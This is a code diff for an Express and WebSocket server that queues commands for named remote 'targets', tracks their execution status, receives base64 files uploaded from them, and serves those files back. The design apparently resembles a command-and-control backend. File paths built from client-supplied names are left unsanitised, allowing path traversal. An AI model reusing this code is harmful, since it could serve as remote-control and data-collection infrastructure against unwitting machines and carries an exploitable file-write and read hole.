@@ -1,3 +1,4 @@
+// server.js
 import express from "express";
 import { WebSocketServer } from "ws";
 import fs from "fs";
@@ -9,13 +10,13 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
 const COMMAND_FILE = "./commands.json";
-const RECEIVED_DIR = "./received_files";
+const FILES_DIR = path.resolve("./uploaded_files");
 
-if (!fs.existsSync(RECEIVED_DIR)) fs.mkdirSync(RECEIVED_DIR, { recursive: true });
+if (!fs.existsSync(FILES_DIR)) fs.mkdirSync(FILES_DIR, { recursive: true });
 
 let targets = { targets: {} };
 
-// Load existing commands.json
+// Load commands.json if exists
 try {
   if (fs.existsSync(COMMAND_FILE)) {
     targets = JSON.parse(fs.readFileSync(COMMAND_FILE));
@@ -30,14 +31,14 @@ function saveCommands() {
 
 // WebSocket server
 const wss = new WebSocketServer({ noServer: true });
-const clients = new Map(); // key: targetName, value: ws
+const clients = new Map();
 
 wss.on("connection", (ws, req) => {
   let targetName = null;
 
-  ws.on("message", async (message) => {
+  ws.on("message", (msg) => {
     try {
-      const data = JSON.parse(message);
+      const data = JSON.parse(msg);
 
       if (data.type === "register") {
         targetName = data.name;
@@ -46,10 +47,8 @@ wss.on("connection", (ws, req) => {
 
         // send pending commands
         if (targets.targets[targetName]) {
-          targets.targets[targetName].forEach(cmd => {
-            if (cmd.status === "pending") {
-              ws.send(JSON.stringify(cmd));
-            }
+          targets.targets[targetName].forEach((cmd) => {
+            if (cmd.status === "pending") ws.send(JSON.stringify(cmd));
           });
         }
         return;
@@ -58,22 +57,21 @@ wss.on("connection", (ws, req) => {
       if (data.type === "report" && targetName) {
         const cmdId = data.id;
         const status = data.status;
-        const cmd = targets.targets[targetName].find(c => c.id === cmdId);
+        const cmd = targets.targets[targetName].find((c) => c.id === cmdId);
         if (cmd) cmd.status = status;
 
-        // If it's a file push from client
+        // Handle uploaded files from client
         if (data.result && data.result.file_b64 && data.result.name) {
-          const filePath = path.join(RECEIVED_DIR, data.result.name);
+          const filePath = path.join(FILES_DIR, data.result.name);
           fs.writeFileSync(filePath, Buffer.from(data.result.file_b64, "base64"));
-          console.log(`📁 Received file: ${data.result.name} from ${targetName}`);
+          console.log(`📂 File received: ${data.result.name}`);
         }
 
         saveCommands();
         console.log(`Target ${targetName} executed command ${cmdId}: ${status}`);
       }
-
     } catch (err) {
-      console.error("Invalid message:", message, err);
+      console.error("Invalid message:", msg);
     }
   });
 
@@ -107,7 +105,7 @@ app.post("/cancel", (req, res) => {
   if (!target || !id) return res.status(400).send({ error: "Missing fields" });
 
   if (targets.targets[target]) {
-    const cmd = targets.targets[target].find(c => c.id === id);
+    const cmd = targets.targets[target].find((c) => c.id === id);
     if (cmd && cmd.status === "pending") {
       cmd.status = "canceled";
       saveCommands();
@@ -118,16 +116,20 @@ app.post("/cancel", (req, res) => {
 });
 
 app.get("/queue/:target", (req, res) => {
-  const t = req.params.target;
-  res.send(targets.targets[t] || []);
+  res.send(targets.targets[req.params.target] || []);
 });
 
 app.get("/status/:target", (req, res) => {
   res.send({ online: clients.has(req.params.target) });
 });
 
-const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.get("/files/:name", (req, res) => {
+  const filePath = path.join(FILES_DIR, req.params.name);
+  if (!fs.existsSync(filePath)) return res.status(404).send("File not found");
+  res.sendFile(filePath);
+});
 
+const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 server.on("upgrade", (req, socket, head) => {
   wss.handleUpgrade(req, socket, head, (ws) => {
     wss.emit("connection", ws, req);
